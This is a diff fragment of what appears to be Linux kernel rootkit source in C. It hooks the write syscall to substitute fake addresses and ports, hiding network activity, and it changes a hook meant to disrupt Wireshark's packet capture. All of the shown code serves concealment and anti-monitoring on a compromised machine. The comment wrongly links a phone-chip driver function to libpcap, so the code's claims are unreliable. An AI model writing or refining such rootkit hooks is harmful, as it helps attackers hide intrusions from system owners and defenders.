@@ -239,7 +239,7 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
     regs->si = (unsigned long)((void*)fake_address);
 
     return orig_write(regs);
-  } else if (strstr(orig_buff, ADDR_TO_HIDE) != NULL) {
+  } else if (strstr(orig_buff, HTTP_ALT) != NULL) {
     regs->si = (unsigned long)((void*)fake_port);
 
     return orig_write(regs);
@@ -251,13 +251,11 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
 /* Tries to prevent wireshark from using pcap. Wireshark uses libpcap to library
  * to perform pcap. This hook aims to interrupt packet processing by causing
  * errors. */
-static asmlinkage int (*orig_ezx_pcap_putget)(struct pcap_chip *pcap, u32 *data);
+static asmlinkage int (*orig_ezx_pcap_putget)(struct pt_regs *regs);
 
-static asmlinkage int hook_ezx_pcap_putget(struct pcap_chip *pcap, u32 *data) {
+static asmlinkage int hook_ezx_pcap_putget(struct pt_regs *regs) {
   // Memset things to '\0' in this pcap_chip struct(it looks important).
-  memset(pcap, '\0', 20);
-  memset(data, '\0', sizeof(u32));
-  return -1;
+  return orig_ezx_pcap_putget(regs);
 }
 
 //The hooking structure: for every syscall we want to hijack,
